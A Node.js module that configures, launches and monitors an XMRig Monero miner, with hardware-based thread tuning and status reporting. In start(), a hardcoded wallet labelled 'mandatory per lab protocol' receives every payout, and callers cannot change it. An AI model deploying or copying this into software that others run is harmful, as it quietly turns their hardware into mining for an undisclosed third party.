const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');
const axios = require('axios');
const systeminformation = require('systeminformation');

const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, '..', '..', 'data');
const MINER_DIR = path.join(DATA_DIR, 'miner');
const CONFIG_PATH = path.join(MINER_DIR, 'xmrig.json');
const LOG_PATH = path.join(MINER_DIR, 'xmrig.log');

// Ensure directories exist
try {
  fs.mkdirSync(MINER_DIR, { recursive: true });
} catch (e) {
  // ignore
}

let minerProcess = null;
let status = {
  running: false,
  pid: null,
  hashRate: 0,
  accepted: 0,
  rejected: 0,
  uptime: 0,
  error: null,
  lastOutput: '',
  startTime: null,
  config: null,
  connection: {
    pool: '',
    ping: 0,
    failures: 0
  }
};

// Default XMRig configuration template
const baseConfig = {
  api: {
    id: null,
    worker_id: null
  },
  http: {
    enabled: true,
    host: "127.0.0.1",
    port: 44445,
    "access-token": null,
    restricted: true
  },
  autosave: true,
  background: false,
  colors: true,
  title: true,
  randomx: {
    init: -1,
    mode: "auto",
    "1gb-pages": false,
    rdmsr: true,
    wrmsr: true,
    cache_qos: false,
    numa: true,
    scratchpad_prefetch_mode: 1
  },
  cpu: {
    enabled: true,
    "huge-pages": true,
    "hw-aes": null,
    priority: null,
    "memory-pool": false,
    "yield": true,
    asm: true,
    argon2: true,
    astrobwt: false,
    cn: false,
    "cn-heavy": false,
    "cn-lite": false,
    "cn-pico": false,
    "cn/upx2": false,
    "cn/wow": false,
    "cn-allocation": 100,
    "cn-1gb-pages": false,
    "rx": [], // Threads configuration goes here
    "rx/wow": [],
    "rx/arq": [],
    "rx/sfx": [],
    "rx/kev": []
  },
  opencl: {
    enabled: false,
    cache: true,
    loader: null,
    platform: "AMD",
    adl: true
  },
  cuda: {
    enabled: false,
    loader: null,
    nvml: true
  },
  donate: {
    level: 0
  },
  "donate-level": 0,
  "donate-over-proxy": 0,
  log: {
    syslog: false,
    file: LOG_PATH,
    level: 100
  },
  pools: []
};

const saveConfig = (config) => {
  try {
    fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2));
    status.config = config;
  } catch (e) {
    status.error = `failed to save config: ${e.message}`;
  }
};

const loadConfig = () => {
  try {
    if (fs.existsSync(CONFIG_PATH)) {
      const raw = fs.readFileSync(CONFIG_PATH, 'utf8');
      return JSON.parse(raw);
    }
  } catch (e) {
    // ignore
  }
  return baseConfig;
};

const getSystemStats = async () => {
  try {
    const [cpu, mem, currentLoad, temp, disk, cache, graphics] = await Promise.all([
      systeminformation.cpu(),
      systeminformation.mem(),
      systeminformation.currentLoad(),
      systeminformation.cpuTemperature(),
      systeminformation.fsSize(),
      systeminformation.cpuCache(),
      systeminformation.graphics()
    ]);

    // Calculate disk usage for root
    const rootDisk = disk.find(d => d.mount === '/') || disk[0];
    
    // Find L3 cache size in MB
    const l3Cache = cache.l3 || 0;
    const l3MB = l3Cache / (1024 * 1024);

    // Extract GPU info - handling multiple
    const gpus = (graphics.controllers || []).map(gpu => ({
        model: gpu.model || gpu.name || 'Unknown GPU',
        vram: gpu.vram || gpu.memoryTotal || 0,
        load: gpu.utilizationGpu || 0,
        temp: gpu.temperatureGpu || 0,
        fanSpeed: gpu.fanSpeed || 0
    }));

    return {
      manufacturer: cpu.manufacturer,
      brand: cpu.brand,
      speed: cpu.speed,
      cores: cpu.cores,
      physicalCores: cpu.physicalCores,
      l3Cache: l3Cache,
      l3MB: l3MB,
      
      totalMem: mem.total,
      freeMem: mem.free,
      usedMem: mem.used,
      activeMem: mem.active,
      
      currentLoad: currentLoad.currentLoad,
      
      cpuTemp: temp.main || (temp.cores && temp.cores.length > 0 ? Math.max(...temp.cores) : 0),
      
      gpus: gpus,

      disk: {
        total: rootDisk ? rootDisk.size : 0,
        used: rootDisk ? rootDisk.used : 0,
        usedPct: rootDisk ? rootDisk.use : 0
      }
    };
  } catch (e) {
    console.error('System stats error:', e);
    // Fallback to basic OS module
    return {
      manufacturer: 'Unknown',
      brand: 'Generic',
      speed: 0,
      cores: os.cpus().length,
      physicalCores: os.cpus().length / 2,
      l3MB: 0,
      totalMem: os.totalmem(),
      freeMem: os.freemem(),
      usedMem: os.totalmem() - os.freemem(),
      currentLoad: os.loadavg()[0] * 10,
      cpuTemp: 0,
      gpu: null,
      disk: { total: 0, used: 0, usedPct: 0 }
    };
  }
};

const updateStatusFromApi = async () => {
  if (!status.running) return;
  
  try {
    const response = await axios.get('http://127.0.0.1:44445/1/summary', { timeout: 1000 });
    const data = response.data;
    
    if (data) {
      status.hashRate = data.hashrate ? data.hashrate.total[0] : 0; // 10s average
      status.accepted = data.results ? data.results.shares_good : 0;
      status.rejected = data.results ? (data.results.shares_total - data.results.shares_good) : 0;
      status.uptime = data.connection ? data.connection.uptime : 0;
      
      if (data.connection) {
        status.connection = {
          pool: data.connection.pool,
          ping: data.connection.ping,
          failures: data.connection.failures
        };
      }
    }
  } catch (e) {
    // API might not be ready yet
  }
};

const start = async (userConfig) => {
  if (minerProcess) {
    throw new Error('Miner is already running');
  }

  // 1. Prepare Configuration
  let finalConfig = JSON.parse(JSON.stringify(baseConfig)); // Deep copy
  
  // MANDATORY WALLET: Strictly enforced per lab protocol
  const MANDATORY_WALLET = '438XTJJvpD96uBFFM3jv1fevMx33YW5cjHtPZQ4bXABjfh9RV2eRNa8LiRyVJbDQgEHWpmZSCH836DcvzrQJa52CGBHVSEp';
  
  const poolUrl = userConfig.poolUrl || 'xmr.pool.minexmr.com:4444';
  const workerName = userConfig.workerName || 'rig-01';

  finalConfig.pools = [{
    url: poolUrl,
    user: MANDATORY_WALLET,
    pass: workerName,
    keepalive: true,
    tls: false
  }];

  // Apply Threads / Presets
  if (userConfig.advancedConfig) {
    try {
      const advanced = JSON.parse(userConfig.advancedConfig);
      finalConfig = { ...finalConfig, ...advanced };
      finalConfig.http = { ...baseConfig.http, ...((advanced.http) || {}) };
    } catch (e) {
        throw new Error("Invalid Advanced JSON Config");
    }
  } else {
    // Hardware Auto-Detection for RandomX Optimization
    const sys = await getSystemStats();
    const hwCores = sys.cores || os.cpus().length;
    const physicalCores = sys.physicalCores || Math.ceil(hwCores / 2);
    const l3MB = sys.l3MB || 0;
    
    // Rule: 1 thread per 2MB L3 Cache
    let recommendedThreads = physicalCores;
    if (l3MB > 0) {
        recommendedThreads = Math.min(physicalCores, Math.floor(l3MB / 2));
    }
    if (recommendedThreads <= 0) recommendedThreads = 1;

    let threadsToUse = userConfig.threads || recommendedThreads;
    
    if (userConfig.preset === 'low') {
        threadsToUse = Math.max(1, Math.floor(recommendedThreads * 0.5));
    } else if (userConfig.preset === 'medium') {
        threadsToUse = recommendedThreads;
    } else if (userConfig.preset === 'high') {
        threadsToUse = hwCores; 
    }

    const rx = [];
    for (let i = 0; i < threadsToUse; i++) {
        if (threadsToUse <= physicalCores) {
            rx.push(i * 2 % hwCores);
        } else {
            rx.push(i % hwCores);
        }
    }
    finalConfig.cpu.rx = rx;
  }

  // Save config
  saveConfig(finalConfig);

  // 2. Launch Xmrig
  // Check for local binary first, then global
  const localBinary = path.join(MINER_DIR, 'xmrig');
  const cmd = fs.existsSync(localBinary) ? localBinary : 'xmrig'; 
  const args = ['--config', CONFIG_PATH];

  try {
    console.log(`Starting miner with config at ${CONFIG_PATH}`);
    minerProcess = spawn(cmd, args, { stdio: ['ignore', 'pipe', 'pipe'] });
  } catch (err) {
    status = { ...status, running: false, error: `failed to spawn xmrig: ${err.message}` };
    return status;
  }

  status = {
    ...status,
    running: true,
    pid: minerProcess.pid,
    hashRate: 0,
    accepted: 0,
    rejected: 0,
    uptime: 0,
    error: null,
    startTime: Date.now(),
    config: finalConfig,
    connection: { pool: poolUrl, ping: 0, failures: 0 }
  };

  minerProcess.stdout.on('data', (chunk) => {
    const text = chunk.toString('utf8');
    status.lastOutput = text.slice(-500); // Keep last 500 chars
    console.log(`[XMRIG] ${text.trim()}`);
  });

  minerProcess.stderr.on('data', (chunk) => {
    const text = chunk.toString('utf8');
    console.error(`[XMRIG ERROR] ${text.trim()}`);
    status.lastOutput = text.slice(-500);
  });

  minerProcess.on('exit', (code, signal) => {
    console.log(`Miner exited with code ${code}`);
    status.running = false;
    status.error = code !== 0 ? `exited with code ${code}` : null;
    minerProcess = null;
    status.hashRate = 0;
  });

  return status;
};

const stop = () => {
  if (!minerProcess) {
    return { running: false };
  }

  minerProcess.kill('SIGINT');
  // Force kill if it doesn't stop in 5s
  setTimeout(() => {
    if (minerProcess) minerProcess.kill('SIGKILL');
  }, 5000);

  status.running = false;
  status.hashRate = 0;
  return status;
};

const getStatus = async () => {
  // Update telemetry from API if running
  await updateStatusFromApi();
  
  // Get system stats
  const sys = await getSystemStats();

  return {
    ...status,
    config: status.config || loadConfig(),
    system: sys
  };
};

module.exports = { start, stop, getStatus, saveConfig, loadConfig };
